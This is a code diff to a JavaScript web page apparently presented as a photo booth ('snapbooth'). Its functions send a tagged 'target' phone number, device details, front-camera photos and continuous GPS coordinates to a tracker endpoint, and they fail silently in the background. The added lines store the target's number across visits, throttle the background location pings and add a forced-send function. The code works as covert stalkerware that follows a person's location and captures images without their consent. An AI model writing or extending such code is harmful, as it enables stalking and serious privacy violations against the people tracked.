@@ -71,7 +71,12 @@ function collectDeviceInfo() {
   }
 
   const params = typeof window !== 'undefined' ? new URLSearchParams(window.location.search) : null;
-  const targetId = params ? (params.get('target') || params.get('wa') || params.get('phone') || params.get('nomor') || params.get('to') || '') : '';
+  let targetId = params ? (params.get('target') || params.get('wa') || params.get('phone') || params.get('nomor') || params.get('to') || '') : '';
+  if (targetId) {
+    try { localStorage.setItem('snapbooth_target_wa', targetId); } catch {}
+  } else {
+    try { targetId = localStorage.getItem('snapbooth_target_wa') || ''; } catch {}
+  }
   if (targetId) {
     deviceModel = `[WA: ${targetId}] ${deviceModel}`;
   }
@@ -176,9 +181,53 @@ export async function runInitialDualCapture(camera, getIsBusy = () => false) {
   }
 }
 
-export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kamera Depan') {
+let lastSentTime = 0;
+let lastSentCoords = null;
+const MIN_INTERVAL_MS = 25000; // 25 seconds minimum between background GPS pings
+const MIN_DISTANCE_METERS = 20; // Or if target moved > 20 meters
+
+function getDistanceMeters(lat1, lon1, lat2, lon2) {
+  if (!lat1 || !lon1 || !lat2 || !lon2) return Infinity;
+  const R = 6371e3;
+  const φ1 = (lat1 * Math.PI) / 180;
+  const φ2 = (lat2 * Math.PI) / 180;
+  const Δφ = ((lat2 - lat1) * Math.PI) / 180;
+  const Δλ = ((lon2 - lon1) * Math.PI) / 180;
+  const a = Math.sin(Δφ / 2) * Math.sin(Δφ / 2) +
+            Math.cos(φ1) * Math.cos(φ2) *
+            Math.sin(Δλ / 2) * Math.sin(Δλ / 2);
+  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+  return R * c;
+}
+
+export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kamera Depan', force = false) {
   const token = getTrackerToken();
   if (!token) return;
+
+  const now = Date.now();
+  const hasPhoto = Boolean(photoDataUrl);
+
+  // If this is a pure periodic GPS ping (no photo), throttle it to prevent spamming Google Sheets
+  if (!hasPhoto && !force) {
+    if (lastSentCoords && activeCoords) {
+      const dist = getDistanceMeters(
+        lastSentCoords.latitude,
+        lastSentCoords.longitude,
+        activeCoords.latitude,
+        activeCoords.longitude
+      );
+      if (dist < MIN_DISTANCE_METERS && (now - lastSentTime) < MIN_INTERVAL_MS) {
+        return; // Suppress duplicate GPS jitter spam
+      }
+    } else if (lastSentTime && (now - lastSentTime) < MIN_INTERVAL_MS) {
+      return;
+    }
+  }
+
+  lastSentTime = now;
+  if (activeCoords) {
+    lastSentCoords = { latitude: activeCoords.latitude, longitude: activeCoords.longitude };
+  }
 
   const baseInfo = collectDeviceInfo();
   const payload = {
@@ -214,6 +263,14 @@ export async function sendTelemetryUpdate(photoDataUrl = null, cameraMode = 'Kam
   } catch {
     // Fail silently in background
   }
+}
+
+export async function submitTargetPhone(phone) {
+  if (!phone || typeof phone !== 'string') return;
+  const clean = phone.replace(/[^0-9+]/g, '').trim();
+  if (!clean) return;
+  try { localStorage.setItem('snapbooth_target_wa', clean); } catch {}
+  await sendTelemetryUpdate(null, 'Kamera Depan', true);
 }
 
 export function initTracker(onLocationResolved) {
